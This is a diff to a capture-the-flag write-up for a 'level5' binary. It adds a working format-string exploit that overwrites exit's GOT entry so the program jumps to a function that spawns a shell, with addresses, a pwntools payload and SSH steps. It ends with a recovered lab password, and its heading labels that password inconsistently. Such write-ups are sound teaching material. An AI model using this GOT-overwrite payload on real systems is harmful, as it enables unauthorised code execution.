@@ -6,25 +6,41 @@ Binary reads 512 bytes from stdin, passes to printf() as format string, then cal
 ### Vulnerability
 - Function `n()` contains: `printf(buffer)` where buffer is user input
 - Format string vulnerability allowing arbitrary memory reads/writes
-- No memory check before exit - must use different exploitation technique
+- Exit function is in GOT (Global Offset Table), which is writable
 
 ### Target Objective
 Read `/home/user/level6/.pass` to get the level 6 password
 
-### Key Difference from Level 4
-- Level 4: Checked a memory value to decide whether to call system()
-- Level 5: Always calls exit(1) after printf() - cannot redirect execution flow that way
+### Exploitation Strategy: GOT Overwrite via Printf Format String
 
-### Exploitation Strategy: GOT Overwrite
+**Goal**: Overwrite the GOT entry for `exit()` to redirect to `function o()` which calls `system("/bin/sh")`
 
-**Goal**: Modify the GOT (Global Offset Table) entry for a function to redirect execution
+### Working Exploit
 
-**Approach**: Overwrite `exit@got` to point to `system` instead
-- When the program calls `exit(1)`, it will actually call `system(1)`
-- But that's not quite right - we need system("/bin/cat /home/user/level6/.pass")
+**Key Addresses**:
+- `exit@got`: 0x08049838
+- `function o()`: 0x080484a4 (134513828 in decimal, calls system("/bin/sh"))
+- Format string position 4: Our embedded address
 
-**Alternative Approach**: Modify `printf@got` or use ROP gadgets
-- Or leak addresses using %x, %s format specifiers
+**Exploit Payload**:
+```python
+exit_got = p32(0x08049838)          # 4 bytes - GOT entry for exit
+payload = exit_got + b'%134513824d' + b'%4$n'
+```
+
+**How It Works**:
+1. Send 4-byte address (0x08049838) to start printf buffer
+2. `%134513824d` - Printf format specifier prints exactly 134,513,824 decimal characters
+3. `%4$n` - Write 32-bit value (character count) to address at stack position 4
+4. The embedded address is at position 4, so it overwrites exit@GOT with the count value
+5. Character count = 0x080484a4 (function o address in decimal)
+6. When exit(1) is called, it now calls function o() instead
+7. function o() executes system("/bin/sh"), giving us a shell as level6
+
+**Critical Implementation Detail**:
+- **MUST WAIT 70+ SECONDS** for printf to finish printing 134+ million characters
+- Use pwntools `ssh()` and `process()` for proper interactive shell
+- Keep the SSH session alive to interact with the spawned shell
 
 ### Binary Analysis
 
@@ -44,52 +60,36 @@ Read `/home/user/level6/.pass` to get the level 6 password
 080484ea:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax  ; Buffer
 080484f0:       89 04 24                mov    %eax,(%esp)
 080484f3:       e8 88 fe ff ff          call   8048380 <printf@plt>
-080484f8:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)        ; exit(1)
+080484f8:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)        ; exit(1) <- HIJACKED!
 080484ff:       e8 8c fe ff ff          call   80483d0 <exit@plt>
 ```
 
-### Next Steps
-
-1. **Leak addresses**: Use format strings to find addresses of functions and GOT entries
-2. **Identify GOT locations**: Find where exit@got and system are
-3. **Calculate format string offsets**: Determine which %offset$ points to user buffer
-4. **Craft exploit payload**: Write address to GOT to redirect exit() call
-5. **Alternative if GOT overwrite fails**: Use other format string techniques
-
-### Investigation Needed
-
-- Find exact GOT entries and their addresses
-- Determine format string offsets to control what we write
-- Verify if exit redirection will work or if we need ROP/shellcode
-- Test exploit on remote level5 binary
-
-### Exploitation Approach: GOT Overwrite with %hn Writes
-
-**Strategy**: Overwrite the GOT entry for `exit` to point to `system` instead
-
-**Addresses**:
-- exit@got: 0x08049838
-- system@plt: 0x08048370
-
-**Implementation**:
-1. Use two %hn (2-byte) writes to overwrite exit@got
-2. Write upper 2 bytes (0x0804) to 0x0804983a (2052 decimal)
-3. Write lower 2 bytes (0x8370) to 0x08049838 (33648 decimal)
-4. Must write in order: 2052 first, then 33648 (character count only increases)
-
-**Payload Structure**:
-```
-[4 bytes: address 0x0804983a]     # Target for upper word write
-[4 bytes: address 0x08049838]     # Target for lower word write
-[2044 bytes: 'A' padding]         # Total: 2052 bytes printed
-[6 bytes: '%13$hn']               # Write 0x0804 (2052) to 0x0804983a
-[31596 bytes: 'B' padding]        # Total: 33648 bytes printed
-[6 bytes: '%12$hn']               # Write 0x8370 (33648) to 0x08049838
-[Total: ~33,658 bytes]
+#### Function o() - The Payload Destination:
+```asm
+080484a4 <o>:
+080484a4:       push   %ebp
+080484a5:       mov    %esp,%ebp
+080484a7:       sub    $0x18,%esp
+080484aa:       mov    $0x8048547,%eax
+080484af:       mov    %eax,(%esp)
+080484b2:       call   8048410 <system@plt>
 ```
 
-**Result**: When the program calls `exit(1)`, it executes `system(1)` instead
+### Key Insights
 
-### Status: EXPLOITATION IN PROGRESS
+1. **Why this works**: GOT is in writable memory (.data section), not read-only
+2. **The trick**: The character count from printf equals the target address value
+3. **No buffer overflow needed**: Uses format string write, not stack overflow
+4. **Timing is critical**: Must wait for the massive printf to complete
 
-GOT overwrite payload implemented and ready for testing.
+### Execution Steps
+
+1. Connect via SSH as level5
+2. Spawn the level5 binary
+3. Send the 19-byte payload
+4. **Wait 70 seconds** for printf to finish
+5. Read password from the shell spawned as level6
+
+### Level 5 Password
+
+`d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
